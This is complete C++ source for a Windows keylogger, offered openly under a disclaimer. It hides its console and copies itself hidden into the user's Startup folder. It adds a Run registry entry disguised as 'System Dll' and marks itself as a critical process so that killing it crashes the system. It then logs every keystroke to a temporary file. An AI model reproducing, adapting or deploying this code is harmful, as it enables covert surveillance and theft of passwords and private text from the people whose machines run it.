/**
* I Am Not Responsible For Any Act Resultant
* For Its Use
**/
#include <iostream>
#include <windows.h>
#include <string>
#include <fstream>
using namespace std;
typedef VOID ( _stdcall *RtlSetProcessIsCritical ) (
       IN BOOLEAN        NewValue,
       OUT PBOOLEAN OldValue, // (optional)
       IN BOOLEAN      IsWinlogon );
BOOL unkillable()
{
   HANDLE hDLL;
   RtlSetProcessIsCritical fSetCritical;
   hDLL = LoadLibraryA("ntdll.dll");
   if ( hDLL != NULL )
   {
   	    HANDLE hToken;
		LUID luid;
		TOKEN_PRIVILEGES tkprivs;
		ZeroMemory(&tkprivs, sizeof(tkprivs));
		if(!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
			return FALSE;
		if(!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)){
			CloseHandle(hToken); return FALSE;
		}
		tkprivs.PrivilegeCount = 1;
		tkprivs.Privileges[0].Luid = luid;
		tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
		CloseHandle(hToken);
        (fSetCritical) = (RtlSetProcessIsCritical) GetProcAddress( (HINSTANCE)hDLL, "RtlSetProcessIsCritical" );
        if(!fSetCritical) return 0;
        fSetCritical(1,0,0);
        return 1;
   }
    else
        return 0;
}
bool Once()
{
    HANDLE  m_hStartEvent = CreateEventW( NULL, FALSE, FALSE, L"vdyqgwyggYUGQWUGIDBYQW" );
    if(m_hStartEvent == NULL)
    {
    CloseHandle( m_hStartEvent );
        return false;
    }
    if ( GetLastError() == ERROR_ALREADY_EXISTS ) {

        CloseHandle( m_hStartEvent );
        m_hStartEvent = NULL;
        // already exist
        // send message from here to existing copy of the application
        return false;
    }
    // the only instance, start in a usual way
    return true;
}
void WriteData(string Text)
{
    string tm = getenv("tmp");
    tm.append("\\log.tmp");
    ofstream Logs;
    Logs.open(tm.c_str(),fstream::app);
    Logs << Text;
    Logs.close();
}
bool FileExist(string path)
{
    ifstream f(path.c_str());
    return f.good();
}
int main()
{

    string startup = getenv("UserProfile");
    startup.append("\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
    char cMe[MAX_PATH];
    string name = string( cMe, GetModuleFileName( NULL, cMe, MAX_PATH ) );
    string path = name.substr(0, name.find_last_of("\\"));
    const size_t last_slash_idx = name.find_last_of("\\/");
    if (string::npos != last_slash_idx)
    {
        name.erase(0, last_slash_idx + 1);
    }
    const size_t period_idx = name.rfind('.');
    if (string::npos != period_idx)
    {
        name.erase(period_idx);
    }
    startup.append(name);
    startup.append(".exe");
    string tmp=path;
    tmp.append("\\");
    tmp.append(name);
    tmp.append(".exe");
    if(!FileExist(startup))
    {
        CopyFile(tmp.c_str(),startup.c_str(),0);
        SetFileAttributes(startup.c_str(),FILE_ATTRIBUTE_HIDDEN);
    }
    HKEY hKey;
    LONG registryKey2 = RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",NULL,KEY_ALL_ACCESS,&hKey);
    if(registryKey2 == ERROR_SUCCESS)
    {
        RegSetValueEx (hKey, TEXT("System Dll"), 0, REG_SZ, (const BYTE*)tmp.c_str(), strlen(tmp.c_str())+1);
    }
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth,0);
    /**
    Security Checks : )
    **/
    if(!Once()) /***** Check for One Instance *****/
    {
        return 0;
    }
    unkillable();
    while(true)
    {
        for(int key=8;key<=255;key++)
        {
            if(GetAsyncKeyState(key) == -32767)
            {
                switch(key)
                {
                case VK_NUMPAD0:
                    if(GetKeyState(VK_NUMLOCK) & 0x0001 != 0)
                        WriteData("0");
                    else
                        WriteData("[Insert]");
                break;
                case VK_NUMPAD1:
                    if(GetKeyState(VK_NUMLOCK) & 0x0001 != 0)
                        WriteData("1");
                    else
                        WriteData("[End]");
                break;
                case VK_NUMPAD2:
                    if(GetKeyState(VK_NUMLOCK) & 0x0001 != 0)
                        WriteData("2");
                    else
                        WriteData("[Arrow Down]");
                break;
                case VK_NUMPAD3:
                    if(GetKeyState(VK_NUMLOCK) & 0x0001 != 0)
                        WriteData("3");
                    else
                        WriteData("[Page Down]");
                break;
                case VK_NUMPAD4:
                    if(GetKeyState(VK_NUMLOCK) & 0x0001 != 0)
                        WriteData("4");
                    else
                        WriteData("[Left Arrow]");
                break;
                case VK_NUMPAD5:
                    if(GetKeyState(VK_NUMLOCK) & 0x0001 != 0)
                        WriteData("5");
                    else
                        WriteData("[End Of Line]");
                break;
                case VK_NUMPAD6:
                    if(GetKeyState(VK_NUMLOCK) & 0x0001 != 0)
                        WriteData("6");
                    else
                        WriteData("[Right Arrow]");
                break;
                case VK_NUMPAD7:
                    if(GetKeyState(VK_NUMLOCK) & 0x0001 != 0)
                        WriteData("7");
                    else
                        WriteData("[Home]");
                break;
                case VK_NUMPAD8:
                    if(GetKeyState(VK_NUMLOCK) & 0x0001 != 0)
                        WriteData("8");
                    else
                        WriteData("[Arrow Up]");
                break;
                case VK_NUMPAD9:
                    if(GetKeyState(VK_NUMLOCK) & 0x0001 != 0)
                        WriteData("9");
                    else
                        WriteData("[Page Up");
                break;
                case VK_CAPITAL:
                    WriteData("[Capslock]");
                break;
                case VK_CONTROL:
                    WriteData("[Control]");
                break;
                case VK_DELETE:
                    WriteData("[Delete]");
                break;
                case VK_DIVIDE:
                    WriteData("\\");
                break;
                case VK_DOWN:
                    WriteData("[Arrow Down]");
                break;
                case VK_END:
                    WriteData("[End]");
                break;
                case VK_ESCAPE:
                    WriteData("[Escape]");
                break;
                case VK_HOME:
                    WriteData("[Home]");
                break;
                case VK_INSERT:
                    WriteData("[Insert]");
                break;
                case VK_LWIN:
                case VK_RWIN:
                    WriteData("[Windows Key]");
                break;
                case VK_LEFT:
                    WriteData("[Left Arrow]");
                break;
                case 0xBC:
                    WriteData("[,]");
                break;
                case 0xBE:
                    WriteData("[.]");
                break;
                case VK_PAUSE:
                    WriteData("[Pause]");
                break;
                case VK_PRINT:
                    WriteData("[Print]");
                break;
                case VK_RETURN:
                    WriteData("[Enter]");
                break;
                case VK_RIGHT:
                    WriteData("[Right Arrow]");
                break;
                case VK_SHIFT:
                    WriteData("[Shift]");
                break;
                case VK_SLEEP:
                    WriteData("[Sleep]");
                break;
                case VK_SPACE:
                    WriteData("[Space]");
                break;
                case 33:
                    WriteData("[Page Up]");
                break;
                case 34:
                    WriteData("[Page Down]");
                break;
                case 189:
                    if(GetAsyncKeyState(VK_SHIFT))
                        WriteData("_");
                    else
                        case 109:
                            WriteData("-");
                break;
                case 187:
                    if(GetAsyncKeyState(VK_SHIFT))
                        WriteData("+");
                    else
                        WriteData("=");
                break;
                case 219:
                    if(GetAsyncKeyState(VK_SHIFT))
                        WriteData("{");
                    else
                        WriteData("[");
                break;
                case 192:
                    if(GetAsyncKeyState(VK_SHIFT))
                        WriteData("~");
                    else
                        WriteData("`");
                break;
                case 220:
                    if(GetAsyncKeyState(VK_SHIFT))
                        WriteData("|");
                    else
                        WriteData("\\");
                break;
                case 221:
                    if(GetAsyncKeyState(VK_SHIFT))
                        WriteData("}");
                    else
                        WriteData("]");
                break;
                case 48:
                    if(GetAsyncKeyState(VK_SHIFT))
                        WriteData(")");
                    else
                        WriteData("0");
                break;
                case 49:
                    if(GetAsyncKeyState(VK_SHIFT))
                        WriteData("!");
                    else
                        WriteData("1");
                break;
                case 50:
                    if(GetAsyncKeyState(VK_SHIFT))
                        WriteData("@");
                    else
                        WriteData("2");
                break;
                case 51:
                    if(GetAsyncKeyState(VK_SHIFT))
                        WriteData("#");
                    else
                        WriteData("3");
                break;
                case 52:
                    if(GetAsyncKeyState(VK_SHIFT))
                        WriteData("$");
                    else
                        WriteData("4");
                break;
                case 53:
                    if(GetAsyncKeyState(VK_SHIFT))
                        WriteData("%%");
                    else
                        WriteData("5");
                break;
                case 54:
                    if(GetAsyncKeyState(VK_SHIFT))
                        WriteData("^");
                    else
                        WriteData("6");
                break;
                case 55:
                    if(GetAsyncKeyState(VK_SHIFT))
                        WriteData("&");
                    else
                        WriteData("7");
                break;
                case 56:
                    if(GetAsyncKeyState(VK_SHIFT))
                        WriteData("*");
                    else
                        WriteData("8");
                break;
                case 57:
                    if(GetAsyncKeyState(VK_SHIFT))
                        WriteData("(");
                    else
                        WriteData("9");
                break;
                case 65:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("A");
                    else
                        WriteData("a");
                break;
                case 66:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("B");
                    else
                        WriteData("b");
                break;
                case 67:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("C");
                    else
                        WriteData("c");
                break;
                case 68:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("D");
                    else
                        WriteData("d");
                break;
                case 69:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("E");
                    else
                        WriteData("e");
                break;
                case 70:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("F");
                    else
                        WriteData("f");
                break;
                case 71:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("G");
                    else
                        WriteData("g");
                break;
                case 72:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("H");
                    else
                        WriteData("h");
                break;
                case 73:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("I");
                    else
                        WriteData("i");
                break;
                case 74:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("J");
                    else
                        WriteData("j");
                break;
                case 75:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("K");
                    else
                        WriteData("k");
                break;
                case 76:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("L");
                    else
                        WriteData("l");
                break;
                case 77:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("M");
                    else
                        WriteData("m");
                break;
                case 78:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("N");
                    else
                        WriteData("n");
                break;
                case 79:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("O");
                    else
                        WriteData("o");
                break;
                case 80:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("P");
                    else
                        WriteData("p");
                break;
                case 81:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("Q");
                    else
                        WriteData("q");
                break;
                case 82:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("R");
                    else
                        WriteData("r");
                break;
                case 83:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("S");
                    else
                        WriteData("s");
                break;
                case 84:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("T");
                    else
                        WriteData("t");
                break;
                case 85:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("U");
                    else
                        WriteData("u");
                break;
                case 86:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("V");
                    else
                        WriteData("v");
                break;
                case 87:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("W");
                    else
                        WriteData("w");
                break;
                case 88:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("X");
                    else
                        WriteData("x");
                break;
                case 89:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("Y");
                    else
                        WriteData("y");
                break;
                case 90:
                    if(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001 != 0))
                        WriteData("Z");
                    else
                        WriteData("z");
                break;
                case 112:
                    WriteData("[F1]");
                break;
                case 113:
                    WriteData("[F2]");
                break;
                case 114:
                    WriteData("[F3]");
                break;
                case 115:
                    WriteData("[F4]");
                break;
                case 116:
                    WriteData("[F5]");
                break;
                case 117:
                    WriteData("[F6]");
                break;
                case 118:
                    WriteData("[F7]");
                break;
                case 119:
                    WriteData("[F8]");
                break;
                case 120:
                    WriteData("[F9]");
                break;
                case 121:
                    WriteData("[F10]");
                break;
                case 122:
                    WriteData("[F11]");
                break;
                case 123:
                    WriteData("[F12]");
                break;
                }
            }
        }
    }
    return 0;
}
